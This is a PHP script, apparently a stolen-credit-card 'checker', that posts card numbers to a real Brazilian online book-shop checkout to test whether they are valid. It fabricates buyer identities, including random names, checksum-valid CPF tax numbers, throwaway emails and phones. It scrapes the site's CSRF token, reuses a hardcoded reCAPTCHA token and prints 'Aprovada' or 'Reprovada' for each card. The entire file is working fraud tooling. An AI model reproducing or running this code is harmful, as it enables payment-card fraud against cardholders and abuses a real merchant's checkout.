<?php
error_reporting(0);
ignore_user_abort(true);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if(isset($str[1])) {
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return '';
}

function deletarCookies() {
    if (file_exists("cookies.txt")) {
        unlink("cookies.txt");
    }
}

function gerarNome() {
    $nomes = ["Joao", "Maria", "Pedro", "Ana", "Carlos", "Julia", "Paulo", "Fernanda"];
    $sobrenomes = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Almeida", "Lima"];
    return $nomes[array_rand($nomes)] . " " . $sobrenomes[array_rand($sobrenomes)];
}

function gerarCPF() {
    $n1 = rand(0, 9);
    $n2 = rand(0, 9);
    $n3 = rand(0, 9);
    $n4 = rand(0, 9);
    $n5 = rand(0, 9);
    $n6 = rand(0, 9);
    $n7 = rand(0, 9);
    $n8 = rand(0, 9);
    $n9 = rand(0, 9);
    
    $d1 = $n9*2 + $n8*3 + $n7*4 + $n6*5 + $n5*6 + $n4*7 + $n3*8 + $n2*9 + $n1*10;
    $d1 = 11 - ($d1 % 11);
    if ($d1 >= 10) $d1 = 0;
    
    $d2 = $d1*2 + $n9*3 + $n8*4 + $n7*5 + $n6*6 + $n5*7 + $n4*8 + $n3*9 + $n2*10 + $n1*11;
    $d2 = 11 - ($d2 % 11);
    if ($d2 >= 10) $d2 = 0;
    
    return $n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;
}

deletarCookies();

$lista = $_GET['lista'];
$lista = str_replace(" " , "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/' , '-' , $lista);
$lista = str_replace("/" , "|", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

if (strlen($ano) == 2) {
    $ano = "20" . $ano;
}

if (strlen($mes) == 1) {
    $mes = "0" . $mes;
}

$nome = gerarNome();
$cpf = gerarCPF();
$email = "r4inestrupagate" . rand(1000, 9999) . "@gmail.com";
$phone = "119" . rand(10000000, 99999999);
$phone_formatted = "(" . substr($phone, 0, 2) . ") " . substr($phone, 2, 5) . "-" . substr($phone, 7);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://livro.dinamicapessoas.com.br/checkout/2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'upgrade-insecure-requests: 1'
));

$checkoutPage = curl_exec($ch);
$csrf_token = getStr($checkoutPage, 'name="csrf-token" content="', '"');

if(!$csrf_token) {
    echo '❌ Reprovada | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | CSRF TOKEN NÃO ENCONTRADO | $cybersecofc';
    exit;
}

// Criar array para os dados JSON
$post_data = array(
    'payment_method' => 'card',
    'user_name' => $nome,
    'user_email' => $email,
    'user_phone' => $phone_formatted,
    'doc_number' => $cpf,
    'coupon_code' => '',
    'website' => '',
    'fax' => '',
    'card_holder_name' => $nome,
    'card_number' => $cc,
    'card_expiry_month' => $mes,
    'card_expiry_year' => $ano,
    'card_cvv' => $cvv,
    'installments' => 1,
    'recaptcha_token' => '0cAFcWeA46spMGP67wAKMlKtqF-H-og4ubsYuuvnGqtPnb5klK1yWTCrnI-CamVgFEDGSdG75Y1E35dpaBrevFXudaaFG7Ujh6qer9KRzqCFFG80-USo9jT3MmCWfhD00eSpLaTZA46XPzK2JpS2-OLWuTRdf6U9_Icr1m_cOfaTdI6vJmH0E65p32lFanS-9CvRuYjOs0X-cdfcOix1f8y5LutI_qvq7K1g_PzdZWaAaUDWsj_nlx608Ha_822pZggnv260n-S4u6nhvpyOH_toxLpmtsjWOwcBH9fvxDwGI8iA5o_VXnykbYOmvpr6QTFzw0N0rzy2whLyi69BKW3WGg5Mn44yfZcB0sYPitZBopHzIQoKQukr7z0vVREy08iOFjYyX-Mq9fGIg1elCAtOAMQa7U-XZro6V7m5nghmQ-6bv3skRQDfhExvzGvMoskKFzzTzPBYVmNR_ZMApTqe6XJ-oO2620CI64-Mh3WvvkWA6OI_jFsfXAV0e1KxOLhvholsZDKe1yzP8W3granKAvqGxbpE0g28SkaLOdSL8_5p4qtISZLXdwH-7_JpGEfcAzlF5q_47JEFWSBoXAnzKFqnBjn7e396sUQZC0qop1BvNZ2BpTJcv-3zkHM6GKXOFsLTXgC9k2ijrYyJYvAIJFrhWI96NxWhjnoNSEsGFaJCrS0BSwYy-ASGcuy88XR6IzSplJzFRCoxutQ1SopWpyXn5VwI1JwP7Xx0VO4I6qyY1C-__f1-yOLqs-zPqcYiwlpU3xX0PMvaPA51I0yTXCltQ6EgO196T7X1pRnKEGYAAJcd9SLDqzDJhCcHZx8z2P1t8UMP_kSKPcr8QWTor-pDknExr0ohKo9XojWvqh9v9ooIY82FLkTUYiPozFPFkJ1wHwuVBW8oQbIBscHmrlSu5RiCvwTXpqKI5Z3Ib66L1BJ1lDPgslmHcXRYjKE4-r6ChPDzUEIB9Vll8UMQkdy6hVZY6AE_v8YPw0lIWoUiZebNK_YX8Y5rRM75R6Hnf0OMNZLQhArGU4mhXNqRGcTUtmniXLCP-O9oi_BiRxdGT8d-CK_lr83nau0jFJQyXRtp8_kJKtlS2VvbIV4Z__O0oQsa3EHCtunDwtR7Xyqzw24I6iaKoAwz1ArxmBlXgV2eZsH84HSFlElNefeGM2hnzimkQkxefVpo3Y6p3bsPs4d-VGdd_avRXhBGQz8tsxs-ISzjKjDn4_X2TXeqn7pzppGrFyY4pPvMkZv8g1wLd5z4PJqeFYcVWGjw8QggZk3uDtp5S12jnv8pLoYH6KUOhz8EXE48JbhnR_Zl6aCdmdR97Aw9eychbxBmz1QFvberg9zBQLR2TjtEuPLjYeu9dQVopqSVNSKR75VPZd1JU-EbNmwGraqyA5s65ebZtQdSjBhhiRNVNOSHxBEGNRLlABEq6QWxbElAFADzUYKA8FsNOSM8skToG8yECbdSplkGRzMdJVT-cmPQ5MH5L6uyR89Qv6pqhLXnhKMXMfobvcROW_NCfU3kX2_9v0GBPz-bP-oEaZywgWWtnzKlsrmWg0Ou-vtvV7P6uPpS0HaZ-J-I7FuZp8XQfJIAJPuJsa-Sy3XbkpxHfJLdigODQSWqBhHgZ6y_wBax4ZA_qLg91klnTAa5rEvacnUjnjfxThZZW4S8T2nTqCJcpHHS_S2BcqbC-DzQNm3SBDir8rLeYw6HYS6G4hQwNZh7UiJrqywWoFZIjJK_qheQZirm7owLb11M6RJnEtEUe1Eve1yhl65ZYatU0xweZAgSK8iCnN48HUJiXfse_yHMW8RB3oIkNUajput64oXlVswa3Jx-BeIUztybdPmUFPk9e358YpyT1KkZcy1HY9qjMEb05O_VuHnm6et_ZbPqyoogSwGdmQtaMYuW-9yz2b04xCb8SwqD9jL4WmKfaIii4KBfkwg4H4TFgnoET_Z25gyHG96TciQC95_YT3GSgDnoq2RBYcYB653iriC87J6RsV1XHsoAc6PJzLDVYNd_sKSGFBUAwqIUVDgBucs2ysVOHWmyFIGzdzkQL8r5HvSNx7EF7SiD2TQPY0ovi0969w-jVrBcqNz8aKisYGp6esniQPPRDAI9pwhG-00AQA6S_UuhUSiLhAN-rggz5GsY0s7mnpcUvp7AO1ilo_cSedrB4T_OREWxdmBWk5PkpxTyOcG_rWX5KWmxkvCZx-vHDZGDwDQDEjkO_EuHd6x1IOfzYpEstPvsVlwCvuR-Fz-LUQOE8Rq9JJeZRLD7y9dQkjn2i4iWqKKce_TAVMFja6ICzY_h4zOLcy4-Aj'
);

curl_setopt($ch, CURLOPT_URL, 'https://livro.dinamicapessoas.com.br/checkout/2/process');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: livro.dinamicapessoas.com.br',
    'sec-ch-ua-platform: "Windows"',
    'x-csrf-token: ' . $csrf_token,
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 OPR/126.0.0.0',
    'sec-ch-ua: "Chromium";v="142", "Opera";v="126", "Not_A Brand";v="99"',
    'content-type: application/json',
    'sec-ch-ua-mobile: ?0',
    'accept: */*',
    'origin: https://livro.dinamicapessoas.com.br',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://livro.dinamicapessoas.com.br/checkout/2',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'priority: u=1, i',
    'Accept-Encoding: gzip'
));

$process_response = curl_exec($ch);
$response_array = json_decode($process_response, true);
curl_close($ch);

if (is_array($response_array) && isset($response_array['success']) && $response_array['success'] === true) {
    echo '✅ Aprovada | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | Autorização Aprovada | $cybersecofc';
} else {
    $errorMsg = isset($response_array['message']) ? $response_array['message'] : 'Transação não autorizada';
    echo '❌ Reprovada | ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | ' . $errorMsg . ' | $cybersecofc';
}
?>
